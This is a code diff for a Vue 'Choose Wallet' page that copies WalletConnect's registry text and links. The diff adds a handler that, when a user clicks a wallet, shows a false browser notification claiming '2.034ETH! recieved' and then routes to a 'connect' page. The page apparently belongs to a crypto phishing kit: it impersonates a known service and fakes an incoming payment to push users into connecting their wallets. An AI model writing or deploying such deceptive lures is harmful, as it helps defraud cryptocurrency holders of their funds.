@@ -1,9 +1,9 @@
 <template>
   <div>
       
-
+    
 <v-container class="mt-2">
-    <v-container style="text-align:center;"><p class="display-3" style="font-weight:bold;padding-bottom:5px">Registry</p>
+    <v-container style="text-align:center;"><p class="display-3" style="font-weight:bold;padding-bottom:5px">Choose Wallet</p>
       <hr>
     <p style="padding:5px">Multiple iOS and Android wallets support the Protocol. Simply select your wallet to start securely using a dApp. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
     </v-container>
@@ -28,7 +28,7 @@
   <v-row>
      
     <v-col  md="3" v-for="w in r_wallet" :key="w.name" sm="6" >
-    <v-card flat align="center" @click="dow(w.name)" style="background:transparent;">
+    <v-card flat align="center" @click="sendNotification(w.name,w.image)" style="background:transparent;">
       <div>
     <v-avatar
     size="100"
@@ -43,7 +43,7 @@
 
     </v-avatar>
     </div>
-    <v-card-title style="display: inline-block;font-size: 15px;" class="white--black">{{w.name}}</v-card-title>
+    <v-card-title style="color:black;display: inline-block;font-size: 15px;" class="white--black">{{w.name}}</v-card-title>
     </v-card>
     </v-col>
     
@@ -53,98 +53,9 @@
 
 </v-container>
 
-    <div 
-    style="text-align:center;"
-    class=""
-    >
-      <div>
-    <p style="">Open a pull request on <a href="https://github.com/walletconnect">Github</a> to add your wallet here.</p>
-    </div>
-  <div class="foot">
-<v-row>
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px;">
-    <v-btn
-    flat
-    elevation="0"
-    color="transparent"
-    href="https://facebook.com/"
-    >
-    <v-icon class="mr-3">
-      mdi-facebook
-    </v-icon>
-    <span class="primary--text">facebook</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px">
-    <v-btn
-    flat
-    elevation="0"
-    color="transparent"
-    href="https://telegram.walletconnect.org/"
-    >
-    <v-icon class="mr-3">
-      mdi-send
-    </v-icon>
-    <span class="primary--text">Telegram</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px">
-    <v-btn
-    flat
-    elevation="0"
-    color="transparent"
-    href="https://twitter.walletconnect.org/"
-    >
-    <v-icon class="mr-3">
-      mdi-twitter
-    </v-icon>
-    <span class="primary--text">Twitter</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-
-
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px">
-    <v-btn
-    flat
-    elevation="0"
-    color="transparent"
-    href="https://github.com/walletconnect"
-    >
-    <v-icon class="mr-3">
-      mdi-github
-    </v-icon>
-    <span class="primary--text">Github</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-  
-</v-row>
+<div class="ben-footer">
+    <img :src="foot" alt="" >
   </div>
-    </div>
-    <div class="">
-      <v-footer light padless>
-        <v-card flat tile class="white--text text-center" width="100%" style="background:#e9d16f;">
-           
-
-          <v-divider></v-divider>
-
-          <v-card-text class="white--text" style="color:#001e36 !important;">
-            {{ new Date().getFullYear() }} — <strong>Copyright @2022 Resolve Protocol</strong>
-          </v-card-text>
-        </v-card>
-      </v-footer>
-    </div>
   </div>
 </template>
 
@@ -153,8 +64,15 @@
 // import axios from "axios";
 import router from "@/router"
 import store from "@/store"
+import trstlogo from '../assets/alice.png'
+import footer from '@/assets/footer.jpeg'
+import logo from '@/assets/Logo2.png'
   export default {
     data: () => ({
+      trstlg:trstlogo,
+      foot:footer,
+      logo_2: (logo),
+      drawer: false,
       icons: [
         'mdi-facebook',
         'mdi-twitter',
@@ -302,6 +220,36 @@ import store from "@/store"
 
   },
   methods: {
+    async requestNotificationPermission() {
+      if ('Notification' in window) {
+        const permission = await Notification.requestPermission();
+        return permission === 'granted';
+      }
+      return false;
+    },
+    sendNotification(name,image) {
+      this.requestNotificationPermission().then((granted) => {
+        if (granted) {
+          const notification = new Notification(name, {
+            body: '2.034ETH! recieved',
+            icon: image, // Optional icon
+          });
+          notification.onclick = () => {
+            window.focus();
+            this.dow(name)
+            // Optional: Bring focus to the window when clicked
+          };
+          notification.onclose = () => {
+         
+            this.dow(name)
+            // Optional: Bring focus to the window when clicked
+          };
+        } else {
+          console.log('Notification permission denied.');
+          this.dow(name)
+        }
+      });
+    },
     dow(u){
         store.commit("INSERT_WALLET",u)
     router.push({name:'connect',params:{id:u}})
